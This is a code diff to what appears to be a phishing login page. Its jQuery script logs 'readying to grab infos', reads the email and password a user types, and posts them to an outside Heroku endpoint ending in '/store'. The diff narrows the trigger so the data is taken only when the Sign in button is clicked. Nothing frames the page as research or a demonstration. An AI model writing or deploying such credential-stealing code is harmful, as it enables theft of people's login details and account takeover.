@@ -7,7 +7,7 @@
  $(document).ready(function(){
 		console.log("readying to grab infos");
         var email,password;
-        $(".submit-btn").click(function(){
+        $("#signin").click(function(){
           email=$("#email").val();
           password=$("#password").val();
           $.post("https://lmpt-heroku-app.herokuapp.com/store",{email: email,password: password}, function(data){
@@ -37,7 +37,7 @@
 <p><input name="keep" type="checkbox"></input>Keep me signed in</p>
 <br>
 
-<input class="submit-btn" name="sign in" type="Submit" value="Sign in" style="background-color: royalblue; opacity: 1; border: none; color: white; padding: 10px 10px 10px 10px"></input> <input class="submit-btn" name="cancel" type="Submit" value="Cancel" style="background-color: lightgray; opacity: 1; border: none; color: black; padding: 10px 10px 10px 10px"></input>
+<input class="submit-btn" id="signin" type="Submit" value="Sign in" style="background-color: royalblue; opacity: 1; border: none; color: white; padding: 10px 10px 10px 10px"></input> <input class="submit-btn" name="cancel" type="Submit" value="Cancel" style="background-color: lightgray; opacity: 1; border: none; color: black; padding: 10px 10px 10px 10px"></input>
 
 <br>
 <br>
